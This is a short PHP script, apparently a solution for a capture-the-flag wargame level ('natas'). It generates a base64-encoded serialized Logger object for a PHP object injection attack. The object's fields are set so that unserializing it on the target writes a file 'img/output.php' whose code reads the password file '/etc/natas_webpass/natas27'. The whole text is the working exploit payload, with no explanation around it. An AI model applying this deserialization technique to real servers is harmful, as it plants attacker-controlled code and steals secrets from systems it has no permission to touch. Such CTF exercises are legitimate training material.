<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){

        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="<?php include_once('/etc/natas_webpass/natas27');?>";
        $this->logFile="img/output.php";
    }
}

$output[]=new Logger();
echo base64_encode(serialize($output));
?>
